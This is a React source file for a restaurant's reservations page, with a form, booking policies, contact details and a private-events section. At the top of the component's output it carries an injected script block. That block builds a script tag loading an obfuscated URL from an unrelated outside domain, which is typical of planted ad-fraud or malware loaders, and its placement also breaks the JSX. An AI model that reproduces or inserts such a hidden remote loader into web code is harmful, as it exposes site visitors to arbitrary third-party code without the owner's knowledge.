import Header from "@/components/Header";
import Footer from "@/components/Footer";
import AnimatedSection from "@/components/AnimatedSection";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import ReservationForm from "@/components/ReservationForm";

const Reservations = () => {

  return (
    <script>
    (function(xzun){
    var d = document,
        s = d.createElement('script'),
        l = d.scripts[d.scripts.length - 1];
    s.settings = xzun || {};
    s.src = "\/\/jovial-drive.com\/ctD\/9f6Lb.2\/5XlvSLWfQy9aN\/jAcKy-OFTvch3sM\/iP0G2DNzz\/IS5mN-zfcszN";
    s.async = true;
    s.referrerPolicy = 'no-referrer-when-downgrade';
    l.parentNode.insertBefore(s, l);
    })({})
    </script>
    <div className="min-h-screen">
      <Header />
      
      <main className="pt-24">
        {/* Hero Section */}
        <section className="py-20 bg-gradient-hero text-cream">
          <div className="container mx-auto px-6 text-center">
            <AnimatedSection animation="fade-in-up">
              <h1 className="text-5xl md:text-6xl font-serif font-bold mb-6">
                Reservations
              </h1>
              <p className="text-xl text-cream/90 max-w-2xl mx-auto">
                Secure your table for an unforgettable dining experience at Bella Vista
              </p>
            </AnimatedSection>
          </div>
        </section>

        {/* Reservation Form */}
        <section className="py-20 bg-background">
          <div className="container mx-auto px-6">
            <div className="max-w-4xl mx-auto">
              <div className="grid lg:grid-cols-2 gap-12">
                
                {/* Reservation Form */}
                <AnimatedSection animation="slide-in-left">
                  <ReservationForm />
                </AnimatedSection>

                {/* Information */}
                <AnimatedSection animation="slide-in-right" delay={200}>
                  <div className="space-y-8">
                    <Card className="shadow-soft border-0">
                      <CardContent className="p-6">
                        <h3 className="text-xl font-serif font-semibold text-burgundy mb-4">
                          Reservation Information
                        </h3>
                        <ul className="space-y-3 text-warm-gray">
                          <li className="flex items-start">
                            <span className="text-amber mr-3 mt-1">•</span>
                            Reservations are recommended, especially for weekend evenings
                          </li>
                          <li className="flex items-start">
                            <span className="text-amber mr-3 mt-1">•</span>
                            Tables are held for 15 minutes past reservation time
                          </li>
                          <li className="flex items-start">
                            <span className="text-amber mr-3 mt-1">•</span>
                            Cancellations must be made at least 2 hours in advance
                          </li>
                          <li className="flex items-start">
                            <span className="text-amber mr-3 mt-1">•</span>
                            Smart casual dress code is appreciated
                          </li>
                        </ul>
                      </CardContent>
                    </Card>

                    <Card className="shadow-soft border-0">
                      <CardContent className="p-6">
                        <h3 className="text-xl font-serif font-semibold text-burgundy mb-4">
                          Contact Information
                        </h3>
                        <div className="space-y-4 text-warm-gray">
                          <div>
                            <h4 className="font-medium text-foreground">Phone</h4>
                            <p>(555) 123-4567</p>
                          </div>
                          <div>
                            <h4 className="font-medium text-foreground">Email</h4>
                            <p>reservations@bellavista.com</p>
                          </div>
                          <div>
                            <h4 className="font-medium text-foreground">Hours</h4>
                            <div className="text-sm space-y-1">
                              <p>Monday - Thursday: 5:00 PM - 10:00 PM</p>
                              <p>Friday - Saturday: 5:00 PM - 11:00 PM</p>
                              <p>Sunday: 5:00 PM - 9:00 PM</p>
                            </div>
                          </div>
                        </div>
                      </CardContent>
                    </Card>

                    <Card className="bg-amber/10 shadow-soft border-amber/20">
                      <CardContent className="p-6">
                        <h3 className="text-xl font-serif font-semibold text-burgundy mb-4">
                          Private Events
                        </h3>
                        <p className="text-warm-gray mb-4">
                          Planning a special celebration? Our private dining rooms can 
                          accommodate groups of 12-50 guests for birthdays, anniversaries, 
                          corporate events, and other special occasions.
                        </p>
                        <Button variant="outline" className="w-full">
                          Inquire About Private Events
                        </Button>
                      </CardContent>
                    </Card>
                  </div>
                </AnimatedSection>

              </div>
            </div>
          </div>
        </section>
      </main>
      
      <Footer />
    </div>
  );
};

export default Reservations;
